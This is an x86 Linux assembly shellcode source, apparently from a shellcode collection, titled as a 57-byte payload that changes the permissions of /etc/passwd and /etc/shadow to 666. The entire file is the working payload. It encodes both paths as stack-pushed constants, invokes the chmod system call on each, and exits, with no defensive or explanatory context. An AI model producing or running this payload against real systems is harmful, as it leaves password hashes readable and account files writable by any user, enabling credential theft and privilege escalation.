; Title:	Linux x86 chmod 666 /etc/passwd & /etc/shadow - 57 bytes

global _start

section .text

_start:

	xor eax, eax
	mov cx, 0x1b6
	push eax
	
	push 0x64777373
	push 0x61702f2f
	push 0x6374652f
	mov  ebx, esp
	mov  al,0xf
	int  0x80

	xor eax, eax
	push eax
	
	push 0x776f6461
	push 0x68732f2f	
	push 0x6374652f

	mov ebx, esp
	mov al, 0xf
	int 0x80

	xor eax, eax
	inc eax
	int 0x80
